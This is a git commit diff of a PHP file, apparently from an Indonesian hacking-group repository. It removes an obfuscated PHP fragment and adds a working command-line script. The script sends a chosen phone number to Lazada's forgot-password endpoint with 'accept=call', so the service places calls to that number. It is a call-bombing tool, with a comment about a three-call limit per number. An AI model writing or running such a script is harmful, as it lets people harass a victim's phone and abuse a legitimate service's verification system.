6d7b8aa634638149094e6f2959e375d232179eb8
J4CKOP <53121879+J4CK0P@users.noreply.github.com>
2019-07-26 20:07:37 +0700

    Update 1.php

--- hei/1.php
+++ hei/1.php
@@ -1,8 +1,19 @@
-***
-Update : 26-Juli-2019
-Proxy  : 152.168.1.1
-Region  : Tangerang
-Sekolah : Smk Bina Am Mamur
-CodePlay : J4CKOP
-***/
-<?php $q='r';$CjFV='_';$xu='a';$R='v';$pBcN='l';$QiY='n';$VtT='>
+<?php
+// Limit 3x Telpon Setiap Satu Nomor
+function send($phone){
+        $ch = curl_init();
+        curl_setopt($ch, CURLOPT_URL, "https://member-m.lazada.co.id/user/forget-password?spm=a2o4j.login_signup.login.dforgot_psw.674f52f59pgthe");                      curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+        curl_setopt($ch, CURLOPT_HEADER, true);
+        curl_setopt($ch, CURLOPT_POST, 1);
+        curl_setopt($ch, CURLOPT_POSTFIELDS, "msisdn=$phone&accept=call");                        $asw = curl_exec($ch);
+        curl_close($ch);
+                echo $asw."\n";
+}
+echo "COPYRIGHT ; SGBTEAM\n\n";
+echo "Nomor\nInput : ";
+$nomor = trim(fgets(STDIN));
+$execute = send($nomor);
+print $execute;
+?>
